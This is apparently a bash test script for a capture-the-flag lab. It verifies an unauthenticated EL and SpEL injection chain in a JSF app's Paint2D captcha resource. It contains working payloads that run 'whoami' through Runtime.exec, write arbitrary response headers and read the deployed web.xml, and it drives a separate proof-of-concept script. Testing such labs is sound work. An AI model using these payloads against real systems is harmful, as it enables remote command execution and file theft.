#!/usr/bin/env bash
#
# End-to-end verification of the lab.
#
# Proves the whole chain works against a running container:
#   1. the lab is up and serving the captcha blob
#   2. the blob decodes to a Java serialization stream with exactly two EL sites
#   3. unauthenticated command execution runs as the unprivileged service account
#   4. the one-shot EL injection works without SpEL
#   5. the CTF flags are awarded in ladder order, and NOT awarded early
#
# Usage: tools/verify.sh [base-url]
#
set -uo pipefail

BASE="${1:-http://127.0.0.1:8080}"
CTX="${BASE}/ETOPUPGUI"
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
POC="${HERE}/poc/p2d.py"

pass=0
fail=0

ok()   { printf '  \033[32mok\033[0m   %s\n' "$1"; pass=$((pass+1)); }
bad()  { printf '  \033[31mFAIL\033[0m %s\n' "$1"; fail=$((fail+1)); }
head_() { printf '\n\033[1m%s\033[0m\n' "$1"; }

need() { command -v "$1" >/dev/null 2>&1; }

# The lab is meant to be edited and rebuilt. `docker compose up -d --build` builds a new image
# but does not recreate a container that is already running, so the running lab can keep serving
# old code while the tag points at your fix. Warn instead of failing: the lab itself is fine.
#
# Only meaningful when the target IS this container. Verifying some other host with this script
# should not produce a warning about a local container that has nothing to do with it.
case "${BASE}" in
  http://localhost:*|http://127.0.0.1:*|http://0.0.0.0:*|https://localhost:*|https://127.0.0.1:*)
    if need docker; then
      running="$(docker inspect paint2d-lab --format '{{.Image}}' 2>/dev/null || true)"
      tagged="$(docker images --no-trunc -q paint2d-lab:latest 2>/dev/null | head -1 || true)"
      if [ -n "${running}" ] && [ -n "${tagged}" ] && [ "${running}" != "${tagged}" ]; then
        printf '  \033[33mwarn\033[0m running container is on an older image than paint2d-lab:latest\n'
        printf '       container %s\n' "${running:0:12}"
        printf '       tag      %s\n' "${tagged:0:12}"
        printf '       recreate: docker compose up -d --build --force-recreate\n'
      fi
    fi
    ;;
esac

head_ "1. lab availability"
if curl -fsS --max-time 10 "${CTX}/lab/health" | grep -q '"status":"ok"'; then
  ok "GET ${CTX}/lab/health reports ok"
else
  bad "GET ${CTX}/lab/health did not report ok (is the container up?)"
fi

BLOB="$(curl -fsS --max-time 10 "${CTX}/pages/login.jsf" \
        | grep -o 'Paint2DResource/DATA/[^"]*' | head -1 \
        | sed 's#.*/DATA/##; s#\.jsf$##')"

if [ -n "${BLOB}" ]; then
  ok "login page serves a captcha blob (${#BLOB} chars)"
else
  bad "no captcha blob found on the login page"
fi

# The hint page links are the most common context-path mistake, so assert they resolve.
for link in "${CTX}/lab/health" "${CTX}/lab/flags" "${CTX}/pages/login.jsf"; do
  code="$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 "${link}")"
  if [ "${code}" = "200" ]; then
    ok "hint-page link resolves: ${link}"
  else
    bad "hint-page link ${link} returned ${code}"
  fi
done

head_ "2. blob structure"
if [ -n "${BLOB}" ]; then
  if python3 "${HERE}/tools/check_blob.py" "${BLOB}" | tail -1 | grep -q PASS; then
    ok "stream decodes, exactly 2 EL sites, patch succeeds"
  else
    bad "blob invariants failed (see tools/check_blob.py output)"
  fi
fi

head_ "3. unauthenticated command execution"
if need python3; then
  for cmd in whoami id hostname; do
    out="$(python3 "${POC}" -t "${BASE}" ${cmd} 2>&1)"
    if [ $? -eq 0 ] && [ -n "${out}" ]; then
      ok "${cmd} -> ${out}"
    else
      bad "${cmd} failed: ${out}"
    fi
  done

  whoami_out="$(python3 "${POC}" -t "${BASE}" whoami 2>&1)"
  if [ "${whoami_out}" = "labuser" ]; then
    ok "RCE runs as the unprivileged labuser account"
  else
    bad "whoami returned '${whoami_out}', expected 'labuser'"
  fi
else
  bad "python3 not available"
fi

head_ "4. one-shot EL injection (no SpEL)"
if need python3; then
  out="$(python3 "${POC}" -t "${BASE}" --header --name X-Paint2d --value lab-ok 2>&1)"
  if [ "${out}" = "X-Paint2d: lab-ok" ]; then
    ok "arbitrary response header written from EL alone"
  else
    bad "one-shot header write failed: ${out}"
  fi
fi

head_ "5. CTF flag ladder"
if need python3; then
  # The repo root is passed explicitly: inside a heredoc __file__ is "<stdin>", so the
  # script cannot locate poc/p2d.py relative to itself.
  # PYTHONDONTWRITEBYTECODE keeps the tree clean: importing poc/p2d.py as a module would
  # otherwise drop a poc/__pycache__ directory next to the PoC, which then travels along if
  # someone zips the working copy to share or review it.
  ladder_out="$(PYTHONDONTWRITEBYTECODE=1 python3 - "${BASE}" "${POC}" <<'PY'
import importlib.util, sys

spec = importlib.util.spec_from_file_location("p2d", sys.argv[2])
m = importlib.util.module_from_spec(spec)
spec.loader.exec_module(m)

base = sys.argv[1]
P = m.SPEL_PARSER
WEB_XML = "/usr/local/tomcat/webapps/ETOPUPGUI/WEB-INF/web.xml"


def fresh():
    return m.Client(base, "verify", delay=0.2)


def flag_of(cli, el):
    try:
        _, _, low, _ = cli.send_el(el, [])
        return low.get("x-lab-flag", "")
    except Exception as e:
        return "error: %s" % e


results = []   # (label, want, got)


def check(label, want, got):
    results.append((label, want, got))


# Rung 1: a non-default expression reached the EL engine. No SpEL involved.
cli = fresh()
f1 = flag_of(cli, '#{facesContext.getExternalContext().getResponse().setHeader("X-Probe","1")}')
check("flag{el-injection}", "flag{el-injection}", f1)

# Rung 2: a SpEL parser was instantiated into the session scope.
f2 = flag_of(cli, m.el_put("p", '"x".getClass().forName("%s").newInstance()' % P))
check("flag{spel-bootstrap}", "flag{spel-bootstrap}", f2)

# Rung 3: parse a process-spawning expression, then evaluate it. Only the evaluating
# request may be credited with execution -- parseExpression runs nothing.
spel = ("new java.io.BufferedReader(new java.io.InputStreamReader("
        "T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())).readLine()")
f3_parse = flag_of(cli, m.el_put("e", 'sessionScope["p"].parseExpression("%s")' % m.el_escape(spel)))
check("parse-only is not scored as RCE", "flag{spel-bootstrap}", f3_parse)

try:
    _, out, low, _ = cli.send_el(
        m.el_header("X-Out", 'sessionScope["e"].getValue().toString()'), ["X-Out"])
    rce_flag, rce_out = low.get("x-lab-flag", ""), out
except Exception as e:
    rce_flag, rce_out = "error: %s" % e, None
check("flag{rce-confirmed}", "flag{rce-confirmed}", rce_flag)
check("command returned 'labuser'", "labuser", rce_out)

# Rung 4: same shape, but the stored expression reads the deployed web.xml.
cli2 = fresh()
cli2.send_el(m.el_put("p", '"x".getClass().forName("%s").newInstance()' % P), [])
cli2.send_el(m.el_put("e", 'sessionScope["p"].parseExpression("%s")'
              % m.el_escape('new java.io.FileInputStream("%s").read()' % WEB_XML)), [])
try:
    _, first_byte, low, _ = cli2.send_el(
        m.el_header("X-B", 'sessionScope["e"].getValue().toString()'), ["X-B"])
    file_flag = low.get("x-lab-flag", "")
except Exception as e:
    first_byte, file_flag = "error: %s" % e, "error: %s" % e
check("flag{rce-file-read}", "flag{rce-file-read}", file_flag)
check("file read returned '60'", "60", first_byte)

ok = 0
for label, want, got in results:
    if got == want:
        print("  \033[32mok\033[0m   %s" % label)
        ok += 1
    else:
        print("  \033[31mFAIL\033[0m %s (got '%s')" % (label, got))
print("__COUNTS__ %d %d" % (ok, len(results) - ok))
PY
)"
  printf '%s\n' "${ladder_out}" | grep -v '^__COUNTS__'

  counts="$(printf '%s\n' "${ladder_out}" | grep '^__COUNTS__' | tail -1)"
  l_ok="$(printf '%s' "${counts}" | awk '{print $2}')"
  l_bad="$(printf '%s' "${counts}" | awk '{print $3}')"
  l_ok="${l_ok:-0}"; l_bad="${l_bad:-1}"
  pass=$((pass + l_ok))
  fail=$((fail + l_bad))
fi

head_ "result"
printf '  %d passed, %d failed\n\n' "${pass}" "${fail}"
[ "${fail}" -eq 0 ]
